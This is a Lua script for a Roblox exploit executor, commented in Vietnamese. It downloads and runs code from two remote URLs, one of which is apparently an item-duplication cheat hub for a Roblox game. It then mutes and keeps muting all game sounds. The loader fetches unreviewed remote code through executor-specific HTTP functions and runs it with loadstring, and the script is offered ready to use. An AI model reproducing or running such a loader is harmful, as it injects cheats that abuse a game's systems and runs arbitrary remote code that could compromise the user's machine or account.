local URLS = {
	"https://api.rubis.app/v2/scrap/QGrTKeHMbBd4L3I2/raw",
	"https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/main/Dupe-hub.lua"
}
local MUTE_GUI_SOUNDS = true   -- true = tắt cả âm GUI; false = giữ âm GUI
local WHITELIST_NAMES = {      -- tên Sound muốn giữ (ví dụ "ClickSound"); để trống để tắt mọi thứ
	-- "KeepThisSound"
}
local BACKUP_INTERVAL = 12     -- giây, backup nhẹ nhàng (không nặng máy)
-- =======================================

-- Safe HTTP GET (hỗ trợ nhiều executor)
local function safeHttpGet(url)
	local ok, res = pcall(function()
		-- try game:HttpGet (standard)
		return game:HttpGet(url)
	end)
	if ok and type(res) == "string" then return true, res end

	-- try alternative global if present
	ok, res = pcall(function()
		if syn and syn.request then
			local r = syn.request({Url = url, Method = "GET"})
			return r.Body
		end
		if http_request then
			local r = http_request({Url = url, Method = "GET"})
			return r.Body
		end
		return nil
	end)
	if ok and type(res) == "string" then return true, res end

	return false, "HttpGet failed"
end

-- Safe loadstring (load fallback for some environments)
local function safeLoadString(src)
	local fn
	local ok, err = pcall(function() fn = loadstring and loadstring(src) or load(src) end)
	if not ok or type(fn) ~= "function" then
		return false, ("load failed: %s"):format(tostring(err))
	end
	local ok2, res = pcall(fn)
	if not ok2 then
		return false, ("runtime error: %s"):format(tostring(res))
	end
	return true
end

-- Run each URL safely
for _, url in ipairs(URLS) do
	local ok, srcOrErr = safeHttpGet(url)
	if not ok then
		warn(("RunTwoAndFriendlyMute: fetch failed for %s -> %s"):format(tostring(url), tostring(srcOrErr)))
	else
		local ok2, err2 = safeLoadString(srcOrErr)
		if not ok2 then
			warn(("RunTwoAndFriendlyMute: load/exec failed for %s -> %s"):format(tostring(url), tostring(err2)))
		else
			print(("RunTwoAndFriendlyMute: loaded %s"):format(url))
		end
	end
end

-- ======= Phần mute "thân thiện" (không xung đột) =======
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local weak = { __mode = "k" }
local tracked = setmetatable({}, weak) -- [sound] = {connVolume, connPlaying, connAncestry}

local function isWhitelisted(sound)
	if not sound or not sound.Name then return false end
	for _, name in ipairs(WHITELIST_NAMES) do
		if sound.Name == name then return true end
	end
	return false
end

local function isGuiDescendant(inst)
	if not player or not player:FindFirstChild("PlayerGui") then return false end
	return inst:IsDescendantOf(player.PlayerGui)
end

local function safeSetVolumeZero(sound)
	pcall(function()
		if not sound or not sound.Parent then return end
		-- một số game/instance có readonly; pcall để safe
		if sound.Volume ~= 0 then sound.Volume = 0 end
		if sound.Playing then
			pcall(function() sound:Stop() end)
		end
	end)
end

local function untrackSound(sound)
	local entry = tracked[sound]
	if entry then
		pcall(function()
			if entry.connVolume then entry.connVolume:Disconnect() end
			if entry.connPlaying then entry.connPlaying:Disconnect() end
			if entry.connAncestry then entry.connAncestry:Disconnect() end
		end)
		tracked[sound] = nil
	end
end

local function trackSound(sound)
	if not sound or not sound:IsA("Sound") then return end
	if tracked[sound] then return end
	if isWhitelisted(sound) then return end
	if (not MUTE_GUI_SOUNDS) and isGuiDescendant(sound) then return end

	-- mute ngay
	safeSetVolumeZero(sound)

	-- theo dõi Volume thay đổi
	local connVol = nil
	pcall(function()
		connVol = sound:GetPropertyChangedSignal("Volume"):Connect(function()
			if sound and sound.Parent then
				pcall(function()
					if sound.Volume ~= 0 then sound.Volume = 0 end
				end)
			end
		end)
	end)

	-- theo dõi Playing thay đổi
	local connPlay = nil
	pcall(function()
		connPlay = sound:GetPropertyChangedSignal("Playing"):Connect(function()
			if sound and sound.Parent then
				pcall(function()
					if sound.Playing then sound:Stop() end
				end)
			end
		end)
	end)

	-- dọn khi sound bị remove
	local connAnc = nil
	pcall(function()
		connAnc = sound.AncestryChanged:Connect(function()
			if not sound:IsDescendantOf(game) then
				untrackSound(sound)
			end
		end)
	end)

	tracked[sound] = {connVolume = connVol, connPlaying = connPlay, connAncestry = connAnc}
end

-- Quét tất cả hiện có (sau khi 2 script đã chạy)
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Sound") then
		trackSound(obj)
	end
end

-- Theo dõi âm mới sinh ra
game.DescendantAdded:Connect(function(desc)
	task.defer(function()
		if not desc or not desc.Parent then return end
		if desc:IsA("Sound") then
			trackSound(desc)
			return
		end
		for _, c in ipairs(desc:GetChildren()) do
			if c:IsA("Sound") then
				trackSound(c)
			end
		end
	end)
end)

-- Backup rất nhẹ nhàng (để ép lại nếu cần)
task.spawn(function()
	while true do
		task.wait(BACKUP_INTERVAL)
		for s, _ in pairs(tracked) do
			if s and s.Parent then
				safeSetVolumeZero(s)
			else
				untrackSound(s)
			end
		end
	end
end)
